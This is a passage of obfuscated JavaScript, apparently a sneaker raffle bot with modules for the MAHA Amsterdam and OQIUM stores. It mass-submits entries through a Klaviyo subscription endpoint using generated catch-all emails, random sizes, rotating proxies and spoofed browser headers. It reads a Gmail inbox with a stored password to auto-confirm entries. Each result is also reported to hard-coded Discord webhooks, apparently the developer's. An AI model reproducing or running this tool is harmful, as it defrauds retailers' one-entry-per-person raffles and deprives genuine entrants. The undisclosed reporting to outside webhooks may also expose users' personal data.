                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4bb9af, _0x593531, _0x1079f4) {
                    for (var _0x5dc1fd = 0x0; _0x5dc1fd < _0x593531['length']; _0x5dc1fd++) {
                        async function _0x29e9a1(_0x54ccb0, _0xfe7eac, _0x5cc34d, _0x56fe0b, _0x3e8094) {
                            var _0x5ae992, _0x5cd030 = {}, _0xaea5d4 = [], _0x38740e = {}, _0x45a7d6 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x58f90f = Math['round'](Math['random']() * (_0x45a7d6['length'] - 0x1));
                            _0x56fe0b[_0x54ccb0]['Size'] == 'RANDOM' && (_0x56fe0b[_0x54ccb0]['Size'] = _0x45a7d6[_0x58f90f]);
                            !_0x56fe0b && (_0x56fe0b = {});
                            if (_0xfe7eac != 'ver') {
                                _0x3d4687(_0x5cc34d['name'] + '\x20Task\x20' + (_0x54ccb0 + 0x1) + '\x20/\x20' + _0x56fe0b['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x56fe0b, _0x54ccb0), _0x5cd030 = _0x5cc34d['data'];
                                _0xfe7eac == 'exp' ? _0x5cd030['data']['attributes']['email'] = '' + _0x56fe0b[_0x54ccb0]['FirstName'] + _0x56fe0b[_0x54ccb0]['LastName'] + _0x5f2d88['catchall'] : _0x5cd030['data']['attributes']['email'] = '' + _0x56fe0b[_0x54ccb0]['Email'];
                                if (_0x56fe0b[_0x54ccb0]['Size'] == 'RANDOM') {
                                }
                                _0x5cd030['data']['attributes']['properties']['$first_name'] = '' + _0x56fe0b[_0x54ccb0]['FirstName'], _0x5cd030['data']['attributes']['properties']['$last_name'] = '' + _0x56fe0b[_0x54ccb0]['LastName'], _0x5cd030['data']['attributes']['properties']['$address1'] = _0x56fe0b[_0x54ccb0]['Address1'] + '\x20' + _0x56fe0b[_0x54ccb0]['Address2'] + '\x20' + _0x56fe0b[_0x54ccb0]['HouseNumber'], _0x5cd030['data']['attributes']['properties']['$zip'] = '' + _0x56fe0b[_0x54ccb0]['Zip'], _0x5cd030['data']['attributes']['properties']['$city'] = '' + _0x56fe0b[_0x54ccb0]['City'], _0x5cd030['data']['attributes']['properties']['$country'] = '' + _0x56fe0b[_0x54ccb0]['Country'], _0x5cd030['data']['attributes']['properties']['Size'] = '' + _0x56fe0b[_0x54ccb0]['Size'], _0x5cd030['data']['attributes']['properties']['$phone_number'] = '' + _0x56fe0b[_0x54ccb0]['Phone'], _0x5cd030['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x56fe0b[_0x54ccb0]['Follower'];
                            }
                            if (_0x5f2d88['useRandomProxy'] = ![])
                                var _0x521c18 = _0x3e8094[_0x54ccb0]['split'](':');
                            else
                                var _0x7d360f = Math['round'](Math['random']() * (_0x3e8094['length'] - 0x1)), _0x521c18 = _0x3e8094[_0x7d360f]['split'](':');
                            var _0x4f6f59 = {
                                'jar': _0x26b5a0,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5cc34d['url'],
                                'headers': _0x5cc34d['headers'],
                                'body': JSON['stringify'](_0x5cd030),
                                'proxy': 'http://' + _0x521c18[0x2] + ':' + _0x521c18[0x3] + '@' + _0x521c18[0x0] + ':' + _0x521c18[0x1]
                            };
                            return _0xfe7eac != 'ver' && (_0x4f6f59['url'] = _0x5cc34d['url'], _0x4f6f59['headers'] = _0x5cc34d['headers']), _0xfe7eac == 'ver' && (_0x4f6f59['method'] = 'GET'), new Promise(function (_0x38b1cf, _0xa0f1eb) {
                                callback = async (_0x21b466, _0x597f8f, _0x2062c) => {
                                    if (!_0x21b466 && _0x597f8f['statusCode'] == 0xca || !_0x21b466 && _0x597f8f['statusCode'] == 0xc8) {
                                        if (_0xfe7eac != 'ver') {
                                            var _0x15a387 = await _0x52a86e(_0x56fe0b[_0x54ccb0], _0x5cc34d, 'dev', ![]), _0xf6e066 = await _0x52a86e(_0x56fe0b[_0x54ccb0], _0x5cc34d, 'pub', ![]);
                                            const _0x2f6a03 = {
                                                'succesDEVMSG': { 'embeds': [_0x15a387] },
                                                'succesPUBMSG': { 'embeds': [_0xf6e066] }
                                            };
                                            if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                                try {
                                                    await _0x57bb0c(_0x5f2d88['webhook'], _0x2f6a03['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x2f6a03['succesDEVMSG']), await _0x506d6f(0xc8);
                                            try {
                                                await _0x57bb0c(_0x3f4ede, _0x2f6a03['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x37d376(_0x56fe0b[_0x54ccb0], _0x5cc34d);
                                        }
                                        _0x38b1cf(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x5cc34d['name'] + ']\x20Task\x20' + (_0x54ccb0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xfe7eac != 'ver') {
                                            var _0x1f63e6 = '' + _0x21b466, _0x3a7353 = await _0x52a86e(_0x56fe0b[_0x54ccb0], _0x5cc34d, 'dev', !![], _0x1f63e6), _0x28efae = {};
                                            _0x28efae['errorDEV'] = { 'embeds': [_0x3a7353] }, _0x5c9ba1(_0x56fe0b[_0x54ccb0], _0x5cc34d), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x28efae['errorDEV']), await _0x57bb0c(_0xb4796a, _0x28efae['errorDEV']);
                                        }
                                        _0xa0f1eb(console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x5cc34d['name'] + ']\x20Task\x20' + (_0x54ccb0 + 0x1) + ':\x20' + _0x21b466)));
                                    }
                                };
                                try {
                                    _0xfe7eac != 'ver' && console['log'](_0x15866d() + '\x20[' + _0x5cc34d['name'] + ']\x20Task\x20' + (_0x54ccb0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5cd030['data']['attributes']['email']), _0x5eed11(_0x4f6f59, callback);
                                } catch (_0xcf7a1a) {
                                    console['log'](_0x15866d() + '\x20Task\x20' + (_0x54ccb0 + 0x1) + ':\x20' + _0xcf7a1a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x29e9a1(_0x5dc1fd, 'nor', _0x4bb9af, _0x593531, _0x1079f4), console['log'](_0x15866d() + '\x20[' + _0x4bb9af['name'] + ']\x20Sleeping\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        } catch (_0x1da19f) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1fc29e, _0x3064df, _0x23258c) {
                    var _0x3d0b3c = [];
                    async function _0x342c41() {
                        var _0x352d31 = new _0x40f5d4({
                            'user': _0x5f2d88['masterMail'],
                            'password': _0x5f2d88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5cbc81(_0x104aec) {
                            _0x352d31['openBox']('INBOX', ![], _0x104aec);
                        }
                        _0x352d31['once']('ready', function () {
                            _0x5cbc81(function (_0x4dbdd7, _0x3ba996) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4dbdd7)
                                    throw _0x4dbdd7;
                                _0x352d31['seq']['search'](['UNSEEN'], function (_0x4d4a41, _0x372cd6) {
                                    if (!_0x372cd6 || !_0x372cd6['length'])
                                        console['log'](_0x15866d() + '\x20[' + _0x1fc29e['name'] + ']\x20No\x20mails\x20found'), _0x352d31['end']();
                                    else {
                                        var _0x318d0d = _0x352d31['seq']['fetch'](_0x372cd6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x318d0d['on']('message', function (_0x45b728, _0x44b790) {
                                            var _0x2742e5 = '(#' + _0x44b790 + ')\x20';
                                            _0x45b728['on']('body', function (_0x29e7a9, _0x399497) {
                                                _0xc3daf(_0x29e7a9, (_0x29c4bd, _0xe9bab2) => {
                                                    if (_0xe9bab2['subject'] == 'Confirm\x20Your\x20Subscription' && _0xe9bab2['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0xfe25d = _0xe9bab2['text']['split']('(')[0x1], _0x226221 = _0xfe25d['split'](')')[0x0];
                                                        _0x3d0b3c['push'](_0x226221);
                                                    }
                                                });
                                            }), _0x45b728['once']('end', function () {
                                            });
                                        }), _0x318d0d['once']('error', function (_0x412afa) {
                                            console['log']('Fetch\x20error:\x20' + _0x412afa);
                                        }), _0x318d0d['once']('end', function () {
                                            _0x352d31['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x352d31['once']('error', function (_0x350d0f) {
                            console['log'](_0x195a86['red'](_0x350d0f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x352d31['once']('end', async function () {
                        }), _0x352d31['connect']();
                    }
                    async function _0xf01b94(_0x15a25b, _0x81a427, _0x20407b) {
                        for (var _0x574870 = 0x0; _0x574870 < _0x81a427['length']; _0x574870++) {
                            async function _0x28ead7(_0x422b00, _0x1ccab2, _0x5cc7d9, _0x17aedb, _0x559797) {
                                var _0x37c068, _0x13b1bb = {}, _0x154ee4 = [], _0x24fbf5 = {}, _0x1db9c9 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1bfbc8 = Math['round'](Math['random']() * (_0x1db9c9['length'] - 0x1));
                                _0x17aedb[_0x422b00]['Size'] == 'RANDOM' && (_0x17aedb[_0x422b00]['Size'] = _0x1db9c9[_0x1bfbc8]);
                                !_0x17aedb && (_0x17aedb = {});
                                if (_0x5f2d88['useRandomProxy'] = ![])
                                    var _0x2b59ff = _0x559797[_0x422b00]['split'](':');
                                else
                                    var _0x2974ee = Math['round'](Math['random']() * (_0x559797['length'] - 0x1)), _0x2b59ff = _0x559797[_0x2974ee]['split'](':');
                                var _0x21dc47 = {
                                    'jar': _0x26b5a0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5cc7d9['url'],
                                    'headers': _0x5cc7d9['headers'],
                                    'body': JSON['stringify'](_0x13b1bb),
                                    'proxy': 'http://' + _0x2b59ff[0x2] + ':' + _0x2b59ff[0x3] + '@' + _0x2b59ff[0x0] + ':' + _0x2b59ff[0x1]
                                };
                                return _0x1ccab2 != 'ver' && (_0x21dc47['url'] = _0x5cc7d9['url'], _0x21dc47['headers'] = _0x5cc7d9['headers']), _0x1ccab2 == 'ver' && (_0x21dc47['method'] = 'GET', _0x21dc47['url'] = _0x17aedb[_0x422b00]), new Promise(function (_0x1e3b71, _0x56b99f) {
                                    callback = async (_0x10ab28, _0x55ef35, _0x44d27c) => {
                                        if (!_0x10ab28 && _0x55ef35['statusCode'] == 0xca || !_0x10ab28 && _0x55ef35['statusCode'] == 0xc8) {
                                            if (_0x1ccab2 != 'ver') {
                                                var _0x1429ce = await _0x52a86e(_0x17aedb[_0x422b00], _0x5cc7d9, 'dev', ![]), _0x247b29 = await _0x52a86e(_0x17aedb[_0x422b00], _0x5cc7d9, 'pub', ![]);
                                                const _0x50d9e4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1429ce] },
                                                    'succesPUBMSG': { 'embeds': [_0x247b29] }
                                                };
                                                if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                                    try {
                                                        await _0x57bb0c(_0x5f2d88['webhook'], _0x50d9e4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x50d9e4['succesDEVMSG']), await _0x506d6f(0xc8);
                                                try {
                                                    await _0x57bb0c(_0x3f4ede, _0x50d9e4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x37d376(_0x17aedb[_0x422b00], _0x5cc7d9);
                                            }
                                            _0x1e3b71(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x5cc7d9['name'] + ']\x20Task\x20' + (_0x422b00 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1ccab2 != 'ver') {
                                                var _0xc4489a = '' + _0x10ab28, _0x2bbea3 = await _0x52a86e(_0x17aedb[_0x422b00], _0x5cc7d9, 'dev', !![], _0xc4489a), _0x26e9da = {};
                                                _0x26e9da['errorDEV'] = { 'embeds': [_0x2bbea3] }, _0x5c9ba1(_0x17aedb[_0x422b00], _0x5cc7d9), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x26e9da['errorDEV']), await _0x57bb0c(_0xb4796a, _0x26e9da['errorDEV']);
                                            }
                                            _0x56b99f(console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x5cc7d9['name'] + ']\x20Task\x20' + (_0x422b00 + 0x1) + ':\x20' + _0x10ab28)));
                                        }
                                    };
                                    try {
                                        _0x1ccab2 != 'ver' ? console['log'](_0x15866d() + '\x20[' + _0x5cc7d9['name'] + ']\x20Task\x20' + (_0x422b00 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x13b1bb['data']['attributes']['email']) : console['log'](_0x15866d() + '\x20[' + _0x5cc7d9['name'] + ']\x20Task\x20' + (_0x422b00 + 0x1) + ':\x20Fetching\x20Response'), _0x5eed11(_0x21dc47, callback);
                                    } catch (_0x33f60a) {
                                        console['log'](_0x15866d() + '\x20Task\x20' + (_0x422b00 + 0x1) + ':\x20' + _0x33f60a);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x28ead7(_0x574870, 'ver', _0x15a25b, _0x81a427, _0x20407b), console['log'](_0x15866d() + '\x20[' + _0x15a25b['name'] + ']\x20Sleeping\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                            } catch (_0x3b9381) {
                            }
                        }
                    }
                    try {
                        _0x342c41(), await _0x506d6f(0xfa0), console['log']('Found\x20' + _0x3d0b3c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x506d6f(0x9c4);
                    }
                    await _0xf01b94(_0x1fc29e, _0x3d0b3c, _0x23258c);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x50764a, _0x58fd92, _0x25be20) {
                    for (var _0x1c1d48 = 0x0; _0x1c1d48 < _0x58fd92['length']; _0x1c1d48++) {
                        async function _0x157d92(_0x310604, _0x49c4e8, _0x363700, _0x15df65, _0x5a8ec8) {
                            var _0x2af024, _0x138112 = {}, _0x4f309d = [], _0x4203cc = {}, _0x2ffead = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x38e54d = Math['round'](Math['random']() * (_0x2ffead['length'] - 0x1));
                            _0x15df65[_0x310604]['Size'] == 'RANDOM' && (_0x15df65[_0x310604]['Size'] = _0x2ffead[_0x38e54d]);
                            !_0x15df65 && (_0x15df65 = {});
                            if (_0x49c4e8 != 'ver') {
                                _0x3d4687(_0x363700['name'] + '\x20Task\x20' + (_0x310604 + 0x1) + '\x20/\x20' + _0x15df65['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x15df65, _0x310604), _0x4f309d = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x3ab3dd
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x15df65[_0x310604]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5f2d88['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0xca8e52
                                        }
                                    ]
                                }], _0x4203cc = { 'embeds': _0x4f309d }, _0x138112 = _0x363700['data'];
                                _0x49c4e8 == 'exp' ? _0x138112['data']['attributes']['email'] = '' + _0x15df65[_0x310604]['FirstName'] + _0x15df65[_0x310604]['LastName'] + _0x5f2d88['catchall'] : _0x138112['data']['attributes']['email'] = '' + _0x15df65[_0x310604]['Email'];
                                if (_0x15df65[_0x310604]['Size'] == 'RANDOM') {
                                }
                                _0x138112['data']['attributes']['properties']['$first_name'] = '' + _0x15df65[_0x310604]['FirstName'], _0x138112['data']['attributes']['properties']['$last_name'] = '' + _0x15df65[_0x310604]['LastName'], _0x138112['data']['attributes']['properties']['$address1'] = _0x15df65[_0x310604]['Address1'] + '\x20' + _0x15df65[_0x310604]['Address2'] + '\x20' + _0x15df65[_0x310604]['HouseNumber'], _0x138112['data']['attributes']['properties']['$zip'] = '' + _0x15df65[_0x310604]['Zip'], _0x138112['data']['attributes']['properties']['$city'] = '' + _0x15df65[_0x310604]['City'], _0x138112['data']['attributes']['properties']['$country'] = '' + _0x15df65[_0x310604]['Country'], _0x138112['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x15df65[_0x310604]['Size'], _0x138112['data']['attributes']['properties']['$phone_number'] = '' + _0x15df65[_0x310604]['Phone'], _0x138112['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x15df65[_0x310604]['Follower'];
                            }
                            if (_0x5f2d88['useRandomProxy'] = ![])
                                var _0x3543cd = _0x5a8ec8[_0x310604]['split'](':');
                            else
                                var _0x11e977 = Math['round'](Math['random']() * (_0x5a8ec8['length'] - 0x1)), _0x3543cd = _0x5a8ec8[_0x11e977]['split'](':');
                            var _0xd0d441 = {
                                'jar': _0x26b5a0,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x363700['url'],
                                'headers': _0x363700['headers'],
                                'body': JSON['stringify'](_0x138112),
                                'proxy': 'http://' + _0x3543cd[0x2] + ':' + _0x3543cd[0x3] + '@' + _0x3543cd[0x0] + ':' + _0x3543cd[0x1]
                            };
                            return _0x49c4e8 != 'ver' && (_0xd0d441['url'] = _0x363700['url'], _0xd0d441['headers'] = _0x363700['headers']), _0x49c4e8 == 'ver' && (_0xd0d441['method'] = 'GET'), new Promise(function (_0x1932e9, _0x5af408) {
                                callback = async (_0x1112c1, _0x1efc8d, _0x32e68a) => {
                                    if (!_0x1112c1 && _0x1efc8d['statusCode'] == 0xca || !_0x1112c1 && _0x1efc8d['statusCode'] == 0xc8) {
                                        if (_0x49c4e8 != 'ver') {
                                            var _0x202335 = await _0x52a86e(_0x15df65[_0x310604], _0x363700, 'dev', ![]), _0x3edb95 = await _0x52a86e(_0x15df65[_0x310604], _0x363700, 'pub', ![]);
                                            const _0x849e99 = {
                                                'succesDEVMSG': { 'embeds': [_0x202335] },
                                                'succesPUBMSG': { 'embeds': [_0x3edb95] }
                                            };
                                            if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                                try {
                                                    await _0x57bb0c(_0x5f2d88['webhook'], _0x849e99['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x849e99['succesDEVMSG']), await _0x506d6f(0xc8);
                                            try {
                                                await _0x57bb0c(_0x3f4ede, _0x849e99['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x37d376(_0x15df65[_0x310604], _0x363700);
                                        }
                                        _0x1932e9(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x363700['name'] + ']\x20Task\x20' + (_0x310604 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x49c4e8 != 'ver') {
                                            var _0x4ea98f = '' + _0x1112c1, _0x56cc5e = await _0x52a86e(_0x15df65[_0x310604], _0x363700, 'dev', !![], _0x4ea98f), _0x2ddecd = {};
                                            _0x2ddecd['errorDEV'] = { 'embeds': [_0x56cc5e] }, _0x5c9ba1(_0x15df65[_0x310604], _0x363700), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x2ddecd['errorDEV']), await _0x57bb0c(_0xb4796a, _0x2ddecd['errorDEV']);
                                        }
                                        _0x5af408(console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x363700['name'] + ']\x20Task\x20' + (_0x310604 + 0x1) + ':\x20' + _0x1112c1)));
                                    }
                                };
                                try {
                                    _0x49c4e8 != 'ver' && console['log'](_0x15866d() + '\x20[' + _0x363700['name'] + ']\x20Task\x20' + (_0x310604 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x138112['data']['attributes']['email']), _0x5eed11(_0xd0d441, callback);
                                } catch (_0x2cae0f) {
                                    console['log'](_0x15866d() + '\x20Task\x20' + (_0x310604 + 0x1) + ':\x20' + _0x2cae0f);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x157d92(_0x1c1d48, 'nor', _0x50764a, _0x58fd92, _0x25be20), console['log'](_0x15866d() + '\x20[' + _0x50764a['name'] + ']\x20Sleeping\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        } catch (_0x51a7b5) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5b8a39, _0x39b080, _0x24592a) {
                    var _0x39b080 = [];
                    async function _0x2ff006() {
                        var _0x5403a8 = new _0x40f5d4({
                            'user': _0x5f2d88['masterMail'],
                            'password': _0x5f2d88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x51b0c2(_0x4e54ab) {
                            _0x5403a8['openBox']('INBOX', ![], _0x4e54ab);
                        }
                        _0x5403a8['once']('ready', function () {
                            _0x51b0c2(function (_0x57ec76, _0x5465b9) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x57ec76)
                                    throw _0x57ec76;
                                _0x5403a8['seq']['search'](['UNSEEN'], function (_0xc33faf, _0x2574d1) {
                                    if (!_0x2574d1 || !_0x2574d1['length'])
                                        console['log'](_0x15866d() + '\x20[' + _0x5b8a39['name'] + ']\x20No\x20mails\x20found'), _0x5403a8['end']();
                                    else {
                                        var _0x36339d = _0x5403a8['seq']['fetch'](_0x2574d1, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x36339d['on']('message', function (_0x56561c, _0x43378e) {
                                            var _0x197ca5 = '(#' + _0x43378e + ')\x20';
                                            _0x56561c['on']('body', function (_0x43f61e, _0x18def7) {
                                                _0xc3daf(_0x43f61e, (_0x58c6db, _0x1c8066) => {
                                                    if (_0x1c8066['subject'] == 'Confirm\x20Your\x20Subscription' && _0x1c8066['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x389922 = _0x1c8066['text']['split']('(')[0x1], _0x3d0791 = _0x389922['split'](')')[0x0];
